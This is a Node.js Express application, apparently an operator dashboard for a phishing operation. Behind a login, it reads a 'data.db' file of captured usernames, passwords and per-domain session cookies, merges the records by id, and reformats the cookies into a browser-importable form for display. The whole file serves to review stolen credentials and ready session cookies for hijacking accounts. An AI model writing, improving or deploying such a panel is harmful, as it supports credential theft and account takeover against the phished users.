if (process.env.NODE_ENV !== 'production') {
  require('dotenv').config()
}

const express = require('express')
const app = express()
const path = require('path')
const fs = require('fs').promises
const users = require('./users')
const passport = require('passport')
const bcrypt = require('bcrypt')
const flash = require('express-flash')
const session = require('express-session')

app.set('views', path.join(__dirname, 'views'))
app.use(express.static(__dirname + '/public/'))
app.set('view-engine', 'ejs')
const logger = require('morgan')
app.use(logger('dev'))
//////////////////
app.use(
  express.urlencoded({
    extended: false,
  })
)

const initializePassport = require('./passport-config')

initializePassport(
  passport,
  (name) => users.find((user) => user.name === name),
  (id) => users.find((user) => user.id === id)
)

app.use(express.json())
app.use(flash())
app.use(
  session({
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
  })
)

app.use(passport.initialize())
app.use(passport.session())

//////////////////
app.get('/', checkAuthenticated, async (req, res) => {
  try {
    const fileContent = await fs.readFile('data.db', 'UTF-8')
    const fileLines = fileContent.split('\n')
    const dataMap = new Map()

    fileLines.forEach((line) => {
      if (line.trim().startsWith('{')) {
        try {
          const item = JSON.parse(line)
          if (!dataMap.has(item.id)) {
            item.tokens = convertTokens(item.tokens)
            dataMap.set(item.id, item)
          } else {
            let existingItem = dataMap.get(item.id)
            existingItem.tokens = filterUniqueTokens(
              existingItem.tokens.concat(convertTokens(item.tokens))
            )

            if (item.username && item.username.trim() !== '') {
              existingItem.username = item.username
            }
            if (item.password && item.password.trim() !== '') {
              existingItem.password = item.password
            }
          }
        } catch (err) {
          console.error('Error parsing JSON from line:', line, err)
        }
      }
    })

    const filteredData = Array.from(dataMap.values()).filter(
      (item) => item.username && item.username.trim() !== ''
    )

    res.render('index.ejs', { data: filteredData })
  } catch (err) {
    console.error(err)
    res.status(500).send('Server Error')
  }
})

function convertTokens(tokens) {
  let tokensArray = []
  Object.keys(tokens).forEach((domain) => {
    Object.keys(tokens[domain]).forEach((tokenName) => {
      const tokenDetails = tokens[domain][tokenName]
      tokensArray.push({
        path: tokenDetails.Path || '/',
        domain: domain,
        expirationDate: tokenDetails.ExpirationDate,
        value: tokenDetails.Value,
        name: tokenName,
        httpOnly: tokenDetails.HttpOnly,
        hostOnly: tokenDetails.HostOnly,
      })
    })
  })
  return tokensArray
}

function filterUniqueTokens(tokensArray) {
  const uniqueTokens = []
  const tokenSet = new Set()

  tokensArray.forEach((token) => {
    const tokenSignature = `${token.domain}:${token.name}:${token.value}`
    if (!tokenSet.has(tokenSignature)) {
      uniqueTokens.push(token)
      tokenSet.add(tokenSignature)
    }
  })

  return uniqueTokens
}

app.get('/login', checkNotAuthenticated, (req, res) => {
  res.render('login.ejs')
})

app.post(
  '/login',
  checkNotAuthenticated,
  passport.authenticate('local', {
    successRedirect: '/',
    failureRedirect: '/login',
    failureFlash: true,
  })
)

function checkAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return next()
  }
  res.redirect('/login')
}

function checkNotAuthenticated(req, res, next) {
  if (req.isAuthenticated()) {
    return res.redirect('/')
  }
  next()
}
console.log('Server Running on Port 4000...')
app.listen('4000')
